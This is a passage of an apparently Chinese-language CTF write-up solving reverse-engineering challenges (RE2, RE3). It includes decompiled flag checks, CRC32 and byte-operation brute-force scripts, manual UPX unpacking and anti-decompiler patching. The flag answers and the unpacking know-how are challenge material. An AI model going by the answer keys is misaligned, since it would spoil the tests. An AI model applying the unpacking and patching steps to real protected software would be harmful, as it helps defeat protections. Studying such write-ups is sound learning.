class="number">0x30</span>u);</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v26, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  HIBYTE(v27) = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">  v13 = <span class="string">&#x27;5&#x27;</span>;</span><br><span class="line">  v14 = <span class="string">&#x27;6&#x27;</span>;</span><br><span class="line">  v15 = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">  v16 = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line">  v17 = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">  v18 = <span class="string">&#x27;T&#x27;</span>;</span><br><span class="line">  v19 = <span class="string">&#x27;Z&#x27;</span>;</span><br><span class="line">  v20 = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">  v21 = <span class="string">&#x27;q&#x27;</span>;</span><br><span class="line">  v22 = <span class="string">&#x27;v&#x27;</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v23, <span class="number">0</span>, <span class="number">0x24</span>u);</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(flag) != <span class="number">10</span> )                     <span class="comment">// len(flag) = 10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;v11) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(v10 + flag) == *(&amp;v11 + v3) )</span><br><span class="line">        v2 = <span class="number">1</span>;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; <span class="built_in">strlen</span>(&amp;v11) );</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = __OFSUB__(v10 + <span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">    v4 = v10++ - <span class="number">9</span> &lt; <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(v4 ^ v5) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (*(flag + <span class="number">9</span>) + <span class="number">25</span>) ^ <span class="number">0x19</span>;</span><br><span class="line">      v28 = (*flag - <span class="number">1</span>) ^ <span class="number">0x20</span>;</span><br><span class="line">      v29 = v6;</span><br><span class="line">      v33 = *(flag + <span class="number">1</span>);</span><br><span class="line">      v34 = *(flag + <span class="number">5</span>);</span><br><span class="line">      v30 = <span class="number">45</span>;</span><br><span class="line">      v7 = maybe_crc(&amp;v33, <span class="built_in">strlen</span>(&amp;v33));</span><br><span class="line">      _itoa(v7, &amp;v25, <span class="number">16</span>);</span><br><span class="line">      qmemcpy(&amp;v31, &amp;v25, <span class="built_in">strlen</span>(&amp;v25));</span><br><span class="line">      <span class="built_in">memset</span>(&amp;v25, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">      v27 = <span class="number">0</span>;</span><br><span class="line">      v8 = sub_4012C0(&amp;v33, <span class="built_in">strlen</span>(&amp;v33));</span><br><span class="line">      _itoa(v8, &amp;v25, <span class="number">16</span>);</span><br><span class="line">      *(&amp;v25 + <span class="built_in">strlen</span>(&amp;v25)) = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">      qmemcpy(&amp;v28 + <span class="built_in">strlen</span>(&amp;v28), &amp;v25, <span class="built_in">strlen</span>(&amp;v25));</span><br><span class="line">      v9 = <span class="built_in">strcmp</span>(&amp;v28, aSu5984f05ed827) == <span class="number">0</span>;</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v9 )</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>IDA 大概看一下伪代码发现可能用了某种标准加密算法，用 IDA 插件扫描出 CRC32 的特征表。maybe_crc 就是一个标准的 CRC 算法。</p>
<p>大概逻辑是要求我们输入 10 个字节的 flag，flag 中的字符都要在 2356DESTzcqv 字符集中。之后取出中间 8 个字节进行 CRC 运算得到一个结果，第一个和最后一个字节分别进行某种运算得到结果。将这些结果拼接成一个字符串，和硬编码的字符串进行对比。</p>
<p>第一个字节和最后一个字节可以通过调试找出来，因为字符集中每个字符经过运算的结果都是固定的。接下来剩下的问题就是找到中间 8 个字节到底是什么了。</p>
<p>由于是 CRC 运算，算法不可逆，只能爆破。字符集 12 个字节，爆破难度不算太大。编写脚本</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;2356DESTZcqv&quot;</span></span><br><span class="line">total = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> table:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Tried: &quot;</span> + <span class="built_in">str</span>(total))</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> table:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> table:</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> table:</span><br><span class="line">                        <span class="keyword">for</span> g <span class="keyword">in</span> table:</span><br><span class="line">                            <span class="keyword">for</span> h <span class="keyword">in</span> table:</span><br><span class="line">                                temp = a + b + c + d + e + f + g + h</span><br><span class="line">                                total += <span class="number">1</span></span><br><span class="line">                                <span class="keyword">if</span>((zlib.crc32(temp) &amp; <span class="number">0xffffffff</span>) == <span class="number">0x5984f05e</span>):</span><br><span class="line">                                    <span class="built_in">print</span> temp</span><br><span class="line">                                    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<p>最后跑出结果 cqZS62vD</p>
<p>加上调试确定的字符得到 flag： flag{TcqZS62vD3}</p>
<h2 id="RE3"><a href="#RE3" class="headerlink" title="RE3"></a>RE3</h2><p>程序加壳，初步判断是 UPX 的壳子，但是自动脱壳工具没法搞定，所以只能用 OD 来手动 DUMP。</p>
<p>ESP 定律找到 OEP 然后用插件 dump 程序，比赛的时候我的虚拟机右键菜单突然失灵了，导致 LORDPE 没法用管理员权限跑起来，找不到进程，所以没有修复导入表。 本题不去修复导入表也可以大概分析一下。用 IDA 打开 dump 的程序，主函数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+5h] [ebp-33h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+35h] [ebp-3h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  sub_401000();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n      Hi,  SDNISC 2019 ~~~ \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;serialNumber: &quot;</span>, v3);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( sub_401150(&amp;v5) == <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n --&gt;   Congratulations ~~~   &lt;--\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n --&gt;   Try again ~~~   &lt;--\n&quot;</span>);</span><br><span class="line">  sub_40180D(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>和 RE2 类似，用 sub_401150 函数验证输入。比较特殊的点是首先打开 data.bin 文件，读取全部内容到内存。</p>
<p>sub_401150 函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> <span class="type">int</span> __cdecl <span class="title function_">sub_401150</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [esp+Ch] [ebp-34h]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [esp+Dh] [ebp-33h]</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [esp+3Dh] [ebp-3h]</span></span><br><span class="line"></span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v13, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(flag) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span> - &amp;v12; ; i = <span class="number">1</span> - &amp;v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = &amp;v12 + v1;</span><br><span class="line">      v4 = &amp;v12 + v1 + i;</span><br><span class="line">      v5 = flag[v4 - <span class="number">1</span>];</span><br><span class="line">      v7 = v4 &amp; <span class="number">0x80000001</span>;</span><br><span class="line">      v6 = v7 == <span class="number">0</span>;</span><br><span class="line">      *(&amp;v12 + v1) = v5;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">        v6 = ((v7 - <span class="number">1</span>) | <span class="number">0xFFFFFFFE</span>) == <span class="number">-1</span>;</span><br><span class="line">      v8 = v6 ? v5 ^ <span class="number">0x19</span> : v5 ^ <span class="number">0x20</span>;</span><br><span class="line">      *v3 = v8;</span><br><span class="line">      v9 = sub_4010C0(v8);</span><br><span class="line">      *v3 = v9;</span><br><span class="line">      byte_40B9C0[v1++] = v9;</span><br><span class="line">      <span class="keyword">if</span> ( v1 &gt;= <span class="built_in">strlen</span>(flag) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(flag) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;v12 + v10) != byte_409064[v10] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v10;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v10 &lt; <span class="built_in">strlen</span>(flag) );</span><br><span class="line">  <span class="keyword">if</span> ( v10 != <span class="number">32</span> )</span><br><span class="line">LABEL_18:</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>看起来比较复杂，大概分析一下逻辑是获取输入的数据，长度是 32 字节。然后奇数位置的字节异或 0x20，偶数位置的字节异或 0x19。</p>
<p>主要运算是 sub_4010C0 函数，但是用 IDA 查看反编译结果是 </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> __cdecl <span class="title function_">sub_4010C0</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这显然不正确，转而查看汇编，头部用全局变量 dword_40B9F8 控制程序流转向 ret，猜测是用于欺骗反编译器。</p>
<p>Key_patch 修正第一个基本块的跳转方向，再 F5 得到结果</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int8 __cdecl <span class="title function_">sub_4010C0</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = a1;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *v1;</span><br><span class="line">    <span class="keyword">if</span> ( *v1 &gt; <span class="number">0xC8B5BDC6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xC9D3D4D7</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xCED6A8B7</span>:</span><br><span class="line">          v2 *= <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xFAB9AEB0</span>:</span><br><span class="line">          ++v2;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( *v1 == <span class="number">0xC8B5BDC6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (v2 + <span class="number">1</span>) ^ <span class="number">0x19</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &gt; <span class="number">0xC5D0CFB3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">0xC6C9D1D3</span> )</span><br><span class="line">        v2 *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xC5D0CFB3</span>:</span><br><span class="line">          v2 ^= <span class="number">0x19</span>u;</span><br><span class="line">LABEL_11:</span><br><span class="line">          --v2;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xB5D2B4BE</span>:</span><br><span class="line">          v2 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xBFC7BBB8</span>:</span><br><span class="line">          v2 ^= <span class="number">0x66</span>u;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v1;</span><br><span class="line">    --v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 );</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个函数通过判断 v1 的值对传入的字节做不同操作。但是无法定位 v1 到底是什么，转而用 OD 来看。从内存窗口发现比较的内容是 data.bin，switch case 的条件也是 unicode 编码的数据，翻译过来是社会主义核心价值观中的 8 条。</p>
<p>所以我们可以快速编写一个解析脚本，从 data.bin 中获取到操作的调用顺序。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./data.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">f.close()</span><br><span class="line">func_list = []</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data):</span><br><span class="line">    temp = u32(data[i] + data[i + <span class="number">1</span>] + data[i + <span class="number">2</span>] + data[i + <span class="number">3</span>])</span><br><span class="line">    <span class="keyword">if</span> temp == <span class="number">0x0C8B5BDC6</span>:</span><br><span class="line">        func_list.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0C5D0CFB3</span>:</span><br><span class="line">        func_list.append(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0B5D2B4BE</span>:</span><br><span class="line">        func_list.append(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0BFC7BBB8</span>:</span><br><span class="line">        func_list.append(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0C6C9D1D3</span>:</span><br><span class="line">        func_list.append(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0C9D3D4D7</span>:</span><br><span class="line">        func_list.append(<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0CED6A8B7</span>:</span><br><span class="line">        func_list.append(<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0FAB9AEB0</span>:</span><br><span class="line">        func_list.append(<span class="number">8</span>)</span><br><span class="line">    i += <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> ((char + <span class="number">1</span>) ^ <span class="number">0x19</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> ((char ^ <span class="number">0x19</span>) - <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func3</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func4</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char ^ <span class="number">0x66</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func5</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func6</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char - <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func7</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func8</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char + <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br></pre></td></tr></table></figure></div>

<p>至此  sub_4010C0 的逻辑解析完毕。</p>
<p>在对 flag 中字符进行对应操作之后，会把结果和 byte_409064 数据比对，如果一致说明输入正确。</p>
<p>由于算法比较复杂，我们的思路还是爆破。遍历 0~255 字符空间，对每一个字符执行一遍 func_list 中的操作，看看和期望结果是否相同。爆破脚本</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target = [<span class="number">0x5D</span>,<span class="number">0x2E</span>,<span class="number">0x4C</span>,<span class="number">0x35</span>,<span class="number">0x49</span>,<span class="number">0x30</span>,<span class="number">0x06</span>,<span class="number">0x6E</span>,<span class="number">0x77</span>,<span class="number">0x73</span>,<span class="number">0x64</span>,<span class="number">0x30</span>,<span class="number">0x67</span>,<span class="number">0x72</span>,<span class="number">0x68</span>,<span class="number">0x3C</span>,<span class="number">0x76</span>,<span class="number">0x55</span>,<span class="number">0x5A</span>,<span class="number">0x52</span>,<span class="number">0x58</span>,<span class="number">0x2F</span>,<span class="number">0x7A</span>,<span class="number">0x3A</span>,<span class="number">0x53</span>,<span class="number">0x35</span>,<span class="number">0x5C</span>,<span class="number">0x79</span>,<span class="number">0x2A</span>,<span class="number">0x71</span>,<span class="number">0x09</span>,<span class="number">0x1C</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(target))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./data.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">f.close()</span><br><span class="line">func_list = []</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data):</span><br><span class="line">    temp = u32(data[i] + data[i + <span class="number">1</span>] + data[i + <span class="number">2</span>] + data[i + <span class="number">3</span>])</span><br><span class="line">    <span class="keyword">if</span> temp == <span class="number">0x0C8B5BDC6</span>:</span><br><span class="line">        func_list.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0C5D0CFB3</span>:</span><br><span class="line">        func_list.append(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0B5D2B4BE</span>:</span><br><span class="line">        func_list.append(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0BFC7BBB8</span>:</span><br><span class="line">        func_list.append(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0C6C9D1D3</span>:</span><br><span class="line">        func_list.append(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0C9D3D4D7</span>:</span><br><span class="line">        func_list.append(<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0CED6A8B7</span>:</span><br><span class="line">        func_list.append(<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0FAB9AEB0</span>:</span><br><span class="line">        func_list.append(<span class="number">8</span>)</span><br><span class="line">    i += <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> ((char + <span class="number">1</span>) ^ <span class="number">0x19</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> ((char ^ <span class="number">0x19</span>) - <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func3</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func4</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char ^ <span class="number">0x66</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func5</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func6</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char - <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func7</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func8</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char + <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">total = <span class="number">0</span></span><br><span class="line">token = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">127</span>):</span><br><span class="line">        temp = k</span><br><span class="line">        <span class="keyword">if</span> token % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            char = (k ^ <span class="number">0x19</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            char = (k ^ <span class="number">0x20</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> func_list:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">                char = func1(char)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">2</span>:</span><br><span class="line">                char = func2(char)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">3</span>:</span><br><span class="line">                char = func3(char)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">4</span>:</span><br><span class="line">                char = func4(char)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">5</span>:</span><br><span class="line">                char = func5(char)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">6</span>:</span><br><span class="line">                char = func6(char)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">7</span>:</span><br><span class="line">                char = func7(char)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">8</span>:</span><br><span class="line">                char = func8(char)</span><br><span class="line">        <span class="keyword">if</span> char == t:</span><br><span class="line">            <span class="built_in">print</span><span class="string">&quot;[*]Found char:&quot;</span> + <span class="built_in">chr</span>(temp)</span><br><span class="line">            flag += <span class="built_in">chr</span>(temp)</span><br><span class="line">            total += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    token += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;total: %d&quot;</span> % total)</span><br></pre></td></tr></table></figure></div>

<p>最后结果</p>
